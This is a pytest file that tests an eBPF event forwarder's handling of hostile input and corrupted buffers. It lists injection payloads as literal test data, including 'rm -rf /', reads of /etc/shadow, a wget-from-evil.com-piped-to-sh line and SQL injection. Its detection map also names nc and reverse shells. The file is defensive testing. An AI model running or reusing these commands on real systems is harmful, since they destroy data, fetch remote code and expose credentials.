import os
import sys
import struct
import pytest
from unittest.mock import MagicMock

# Ensure Python can locate the forwarder module in src/
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

import forwarder


@pytest.fixture
def setup_runtime_env():
    """Initializes forwarder state and mock threat signatures before each test."""
    forwarder.THREAT_MAP = {
        "nc": "nc_execution",
        "bash": "reverse_shell_detected",
        "/etc/shadow": "unauthorized_file_read"
    }
    forwarder.recent_alerts = {}


def test_runtime_command_injection_payloads(setup_runtime_env):
    """
    PROOFS: Injecting shell control characters ($(reboot), `rm -rf /`, | bash)
    into eBPF string arguments does not execute shell commands and treats inputs
    strictly as literal string data.
    """
    mock_nc = MagicMock()
    mock_loop = MagicMock()

    # Malicious command injection payloads targeting eBPF string arguments
    malicious_inputs = [
        "nc; rm -rf /; $(reboot)",
        "/etc/shadow | cat /etc/passwd",
        "$(whoami)`touch /tmp/auranet_pwned`",
        "nc && wget http://evil.com/shell.sh -O- | sh",
        "'; DROP TABLE users; --"
    ]

    for attack_str in malicious_inputs:
        str_bytes = attack_str.encode('utf-8')[:256].ljust(256, b'\x00')
        comm_bytes = b"nc\x00".ljust(16, b'\x00')

        # Construct raw 312-byte eBPF event payload matching <QIIIIqq16s256sB7x
        raw_event = forwarder.EVENT_STRUCT.pack(
            0,          # timestamp
            1234,       # pid
            1000,       # uid
            0,          # cgroup_id_high
            0,          # cgroup_id_low
            59,         # syscall_nr (execve)
            0,          # ret
            comm_bytes, # comm (16 bytes)
            str_bytes,  # str_arg (256 bytes)
            0           # flags
        )

        forwarder.process_event(raw_event, mock_nc, mock_loop)

    # Verification: Prove no subshell execution occurred on the host
    assert not os.path.exists("/tmp/auranet_pwned"), "Command Injection Executed! File /tmp/auranet_pwned was created."


def test_runtime_buffer_overflow_and_corrupted_memory(setup_runtime_env):
    """
    PROOFS: Oversized inputs (>256 bytes) and non-UTF-8 binary data
    are strictly bounded and safely decoded without raising MemoryErrors or crashing.
    """
    mock_nc = MagicMock()
    mock_loop = MagicMock()

    # Scenario A: Massive oversized input (>10,000 bytes)
    massive_input = b"A" * 10000
    truncated_arg = massive_input[:256] # Enforced by struct specification

    raw_event_overflow = forwarder.EVENT_STRUCT.pack(
        0, 9999, 0, 0, 0, 2, 0,
        b"cat\x00".ljust(16, b'\x00'),
        truncated_arg,
        0
    )

    forwarder.process_event(raw_event_overflow, mock_nc, mock_loop)

    # Scenario B: Malformed / Non-UTF-8 Binary Payload
    corrupted_bytes = b"\xff\xfe\xf0\x00\xaa\xbb\xcc\xdd" * 32
    raw_event_corrupted = forwarder.EVENT_STRUCT.pack(
        0, 8888, 0, 0, 0, 59, 0,
        b"bad_bin\x00".ljust(16, b'\x00'),
        corrupted_bytes,
        0
    )

    # Safe decoding with 'replace' error handler guarantees execution continues without panicking
    try:
        forwarder.process_event(raw_event_corrupted, mock_nc, mock_loop)
    except Exception as e:
        pytest.fail(f"Buffer processing crashed on corrupted memory input: {e}")
